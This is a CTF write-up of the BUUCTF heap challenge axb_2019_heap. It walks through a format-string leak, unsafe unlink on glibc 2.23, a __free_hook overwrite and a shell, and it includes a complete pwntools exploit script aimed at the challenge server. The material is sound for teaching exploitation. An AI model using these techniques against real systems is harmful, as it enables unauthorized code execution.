# axb_2019_heap — Format String Leak + Unsafe Unlink → BSS Self-Reference

> **Flag**: `flag{...}` (BUU rotates per-connection)
>
> A classic glibc 2.23 heap challenge with two intertwined primitives: (1) a 12-byte format-string buffer in `banner()` that is *just barely* big enough to leak both PIE and libc with one payload, and (2) an `edit` function whose `get_input` helper insists on reading exactly `size+1` bytes — which blocks the process if you don't pad — but lets you forge a complete fake chunk for **unsafe unlink**. The end goal is the textbook BSS self-reference: turn the global `note[]` array into a write primitive, point it at `__free_hook`, and call `system("/bin/sh")`. What I want to record is *why* each step is non-obvious the first time you see it.

## 0. File overview

| Field | Value |
|---|---|
| File | `axb_2019_heap` |
| Format | ELF 64-bit LSB, x86-64, dynamically linked |
| Image base | PIE — leaked at runtime |
| Protections | `PIE / Canary / NX / Partial RELRO` |
| Remote | `node5.buuoj.cn:28896` (BUUCTF) |
| Remote libc | **libc 2.23 (BUU's challenge bundle)** — not Ubuntu 16.04's stock libc6 |
| libc path | `/root/glibc-all-in-one/libs/BUUCTF_libc/libc-2.23-64bit.so` |

`checksec`:

```
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
```

The protection set is the textbook *unsafe-unlink-friendly* combo: Partial RELRO means GOT is writable, glibc 2.23 means `unlink` macro has no integrity check, and PIE only means we need a one-time leak.

## 1. Program structure

The menu offers four operations. From the BSS variables alone you can read off the intended primitives:

```
note[]:  PIE_BASE + 0x202060   (16 bytes per entry: ptr + size)
key:     PIE_BASE + 0x202040   (must equal 43 to allow small malloc — distractor)
counts:  PIE_BASE + 0x202030
```

```
1. add  → idx(0-10), size(>0x80), content → malloc(size), note[idx] = (ptr, size)
2. dele → free(note[idx].ptr), note[idx] = (NULL, 0)
3. show → puts("None!")   ← deliberately broken; we cannot leak via show
4. edit → get_input(note[idx].ptr, note[idx].size)
```

Two pieces of bait are worth ignoring immediately:

- **`key == 43`** lets you `malloc` with `size <= 0x80`. This sounds like the point of the challenge. It isn't — every primitive we need works at size `0x88`, which is in unsorted-bin territory and totally legal without touching `key`.
- **`show` does nothing** — this is the part that pushes you toward heap-based leak techniques. The leak actually comes from a completely separate vulnerability in the banner function.

## 2. The two bugs

### 2.1 Format string in `banner()`

```c
char format[12];
scanf("%s", format);
printf(format);          // ← user-controlled format string
```

This is the leak primitive. Buffer is 12 bytes; longer input clobbers the canary and crashes on function return. So we have at most **12 bytes** to extract everything we need.

### 2.2 `edit` writes anything to any chunk

```c
void edit_note() {
    int idx = read_int();
    get_input(note[idx].ptr, note[idx].size);  // no bounds check on idx, no length check
}
```

`get_input(buf, n)` reads `n+1` bytes — explicitly looping until it has received exactly `n+1` characters. **This will block the connection if you send less than `n+1` bytes** and don't terminate the line. We'll come back to this.

## 3. Format string leak: two pointers in 10 bytes

The stack layout when `printf(format)` runs:

```
position 6   = format buffer itself (4 bytes left from previous frame)
position 11  = saved return into main()         ← PIE leak source
position 15  = __libc_start_main + 0xE0         ← libc leak source
```

Payload: `%11$p%15$p` (10 bytes — fits with 2 bytes to spare).

```python
p.sendlineafter(b'name: ', b'%11$p%15$p')
leak = p.recvline()
parts = leak.split(b'0x')
pie_base  = int(parts[1], 16) - 0x1186
libc_base = int(parts[2], 16) - 0x20830
```

The offsets `0x1186` and `0x20830` are version-locked. `0x1186` is the offset from PIE base to the instruction following the `call banner` in `main`. `0x20830` is `__libc_start_main + 0xE0` for the BUU bundle of libc 2.23.

**Trap**: trying `%p%p%p%p...` to find the right positions blows the buffer. Pick positions by walking through the stack in GDB first, then commit to the exact two indices.

## 4. The unsafe unlink construction

### 4.1 Why unsafe unlink (vs. fastbin, House of X, etc.)

| Constraint | What we have | Implication |
|---|---|---|
| glibc 2.23 | unlink macro is unchecked | unsafe unlink works |
| Partial RELRO | GOT is writable | unlink target can be `__free_hook`-adjacent |
| Allocation size `> 0x80` | smallbin/unsorted only | no fastbin attack |
| `key != 43` by default | small alloc gated off | can't construct fastbin chunks anyway |
| Edit length = chunk size | full data-region control | fake chunk fits comfortably |

Once `unlink` runs on a forged chunk whose `fd = &note - 0x18`, `bk = &note - 0x10`, the macro performs:

```
*(fd + 0x18) = bk      →   *(&note - 0x18 + 0x18) = bk   →   note[0] = &note - 0x10
*(bk + 0x10) = fd      →   *(&note - 0x10 + 0x10) = fd   →   note[0] = &note - 0x18
```

Final value of `note[0]` after both writes is `&note - 0x18`. We will use this in step 5.

### 4.2 Heap layout for unlink

```python
add(0, 0x88, b'v'*8)   # chunk A
dele(0)                 # free A → unsorted bin (so libc parses it as freed before B is allocated)
add(0, 0x88, b'a'*8)   # re-allocate A at the same address
add(1, 0x88, b'b'*8)   # chunk B, immediately after A
```

The `add(0) → dele(0) → add(0)` dance is there to make sure A's chunk header is in a clean state. Without the intermediate `dele`, B's prev-inuse bit may inherit from main_arena's top-chunk view and behave unexpectedly.

```
heap:
+---------- A header (0x90 bytes total) ----------+
| prev_size | size=0x91 |                         |
+-------------------------------------------------+
| A data (0x88 bytes) — we control this entirely  |
+---------- B header ----------+
| prev_size | size=0x91        |
+-------------------------------+
| B data (0x88 bytes)           |
+-------------------------------+
```

### 4.3 Fake chunk inside A

| Offset in A | Bytes | Meaning |
|---|---|---|
| `0x00` | `0x00...00` | fake prev_size |
| `0x08` | `0x0000000000000081` | fake size, P=0 (so unlink doesn't try to coalesce backward) |
| `0x10` | `note_addr - 0x18` | fake `fd` |
| `0x18` | `note_addr - 0x10` | fake `bk` |
| `0x20` – `0x7F` | `'a' * 0x60` | padding |
| `0x80` | `0x80` | overwrites B's `prev_size` (= our fake chunk size) |
| `0x88` | `0x90` | overwrites B's `size`, **clearing PREV_INUSE** |

When `free(B)` runs, glibc sees `B.prev_inuse == 0`, reads `B.prev_size = 0x80`, looks at the chunk located `0x80` bytes before `B` — that's our fake chunk — and runs `unlink(fake_chunk)`.

```python
fake_fd = note_addr - 0x18
fake_bk = note_addr - 0x10

payload  = p64(0) + p64(0x81)
payload += p64(fake_fd) + p64(fake_bk)
payload += b'a' * 0x60
payload += p64(0x80) + p64(0x90)
edit(0, payload)
```

### 4.4 Triggering unlink

```python
add(10, 0x88, b'/bin/sh\x00')   # store "/bin/sh" somewhere safe
dele(1)                           # free(B) → backward coalesce → unlink(fake_chunk)
```

After this, `note[0] = &note[0] - 0x18`.

**Why `idx=10`?** We need `/bin/sh` to be stored in a `note[]` slot that the subsequent `edit(0)` payload won't accidentally overwrite. `edit(0)` will write 0x88 bytes starting at `&note[0] - 0x18 = note_addr - 0x18`, covering `note[0]` through `note[8]` roughly. `idx=10` maps to `note[20]`, which is past that range.

## 5. BSS self-reference → `__free_hook = system`

After unlink, `note[0].ptr = &note[0] - 0x18`. So `edit(0)` writes into the BSS region containing `note[]` itself. We construct a payload that re-points `note[0].ptr` to `__free_hook`:

```
Offset from edit-write base (= &note[0] - 0x18 = 0x202048):
  [0x00..0x17]   padding (24 bytes of zero)
  [0x18..0x1F]   note[0].ptr  ← set to __free_hook
  [0x20..0x27]   note[0].size ← set to 8 (enough to overwrite the hook)
```

```python
payload  = p64(0) * 3 + p64(free_hook) + p64(8)
payload  = payload.ljust(0x88, b'\x00')   # MUST pad to 0x88
edit(0, payload)

edit(0, p64(system))                       # now writes to __free_hook
```

The padding to `0x88` is non-negotiable — recall `get_input` reads exactly `size+1 = 0x89` bytes. Without padding, the second `read` blocks the connection waiting for the remaining bytes.

## 6. Getshell

```python
dele(10)        # free(note[20]) → __free_hook(note[20]) → system("/bin/sh\0")
```

`__free_hook` is called with the pointer about to be freed. That pointer happens to point at memory containing `/bin/sh\0`, which is exactly what `system` expects.

## 7. Full exploit

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

libc = ELF('./libc-2.23-64bit.so')
p = remote('node5.buuoj.cn', 28896)

# --- stage 1: format string leak ---
p.sendlineafter(b'name: ', b'%11$p%15$p')
p.recvuntil(b'Hello, ')
leak = p.recvline().strip().decode()
parts = leak.split('0x')
pie_base  = int(parts[1], 16) - 0x1186
libc_base = int(parts[2], 16) - 0x20830
libc.address = libc_base

note_addr  = pie_base + 0x202060
free_hook  = libc.sym['__free_hook']
system_fn  = libc.sym['system']

log.success(f"PIE  base: {hex(pie_base)}")
log.success(f"libc base: {hex(libc_base)}")

# --- menu helpers ---
def add(i, s, c):
    p.sendlineafter(b'>> ', b'1')
    p.recvuntil(b'(0-10):'); p.sendline(str(i).encode())
    p.recvuntil(b'size:');   p.sendline(str(s).encode())
    p.recvuntil(b'content:'); p.sendline(c)
    p.recvuntil(b'Done!\n')

def dele(i):
    p.sendlineafter(b'>> ', b'2')
    p.recvuntil(b'index:'); p.sendline(str(i).encode())
    p.recvuntil(b'Done!\n')

def edit(i, c):
    p.sendlineafter(b'>> ', b'4')
    p.recvuntil(b'index:'); p.sendline(str(i).encode())
    p.recvuntil(b'content:'); p.sendline(c)
    p.recvuntil(b'Done!\n')

# --- stage 2: heap setup ---
add(0, 0x88, b'v' * 8)
dele(0)
add(0, 0x88, b'a' * 8)
add(1, 0x88, b'b' * 8)

# --- stage 3: fake chunk in A ---
payload  = p64(0) + p64(0x81)
payload += p64(note_addr - 0x18) + p64(note_addr - 0x10)
payload += b'a' * 0x60
payload += p64(0x80) + p64(0x90)
edit(0, payload)

# --- stage 4: park /bin/sh, trigger unlink ---
add(10, 0x88, b'/bin/sh\x00')
dele(1)

# --- stage 5: BSS self-reference → __free_hook ---
payload = p64(0)*3 + p64(free_hook) + p64(8)
edit(0, payload.ljust(0x88, b'\x00'))
edit(0, p64(system_fn))

# --- stage 6: getshell ---
dele(10)
p.interactive()
```

## 8. Traps and lessons learned

| Trap | Why it cost me time | Resolution |
|---|---|---|
| Chasing off-by-one / overlapping chunks | Pattern-matched on "heap challenge with `edit`" and assumed House of Orange | Read the *actual* `edit` body — there's no off-by-one here, just full overwrite. Protections (Partial RELRO + 2.23) point at unsafe unlink |
| Trying to satisfy `key == 43` | Assumed the menu's small-alloc gate had to be opened | `0x88` is fine for everything we need. The `key` check is a distractor |
| `edit(...)` hangs the script | Sent payload shorter than `size` and forgot to terminate | `get_input` reads `size+1` bytes. Always `ljust(size, b'\x00')` before sending |
| `delete(2)` raises "You can't hack me!" | After the first `edit(0)`, the 0x88-byte payload overwrote `note[1]` through `note[8]`, including `note[4]` (= idx 2) | Park `/bin/sh` at `idx=10` (which maps to `note[20]`) — safely past the edit range |
| Reusing canary across connections for ROP | Saw `Canary found` in checksec and tried to ROP off a saved-canary leak | ASLR re-randomises on every connection (and so does the canary). Whatever you leak must be used in the same connection |
| `recvuntil` timing out near getshell | BUU's network latency is non-trivial and the `Done!` echo can lag | Either increase pwntools `timeout`, or stop calling rapid-fire menu functions back-to-back — let the prompts settle |

## 9. Methodology takeaways

The general lessons I keep coming back to:

1. **Read protections first, choose technique second.** `Partial RELRO + glibc 2.23` is a *strong* hint at unsafe unlink before you've even looked at the menu code. Going the other way around — picking a technique and forcing it onto the protections — is how you spend an evening on House of Orange when 30 lines of unlink would have worked.
2. **Format-string buffers measured in bytes are still leak primitives.** 12 bytes feels too small for anything useful. `%N$p` indices let you cram two pointer leaks into 10 bytes. Pick the right `N` ahead of time in GDB, not by spraying `%p`s.
3. **`get_input` family functions read fixed lengths.** Any custom-rolled input function in a CTF binary almost certainly reads a fixed length. Pad your payloads to that length even when the trailing bytes are "irrelevant" — the I/O is what gets you, not the contents.
4. **Once you have BSS self-reference, you have everything.** Pointing the global table at itself is a stronger primitive than any single arbitrary write. It lets you switch targets (`__free_hook`, `__malloc_hook`, `__exit_funcs`, GOT entries) by editing once, with no further setup.
5. **On BUU specifically, always use the bundle libc.** `/root/glibc-all-in-one/libs/BUUCTF_libc/libc-2.23-64bit.so` — never Ubuntu's stock libc6. Symbol offsets differ.

## 10. Related techniques

- [Stack Pivot via `leave;ret`](../pwn/axb_2019_brop64.md) — same competition but a stack-based primitive
- glibc 2.23 unlink macro internals — see [phrack 66/10](http://phrack.org/issues/66/10.html) for the original write-up of malloc maleficarum, where this primitive was first systematised
  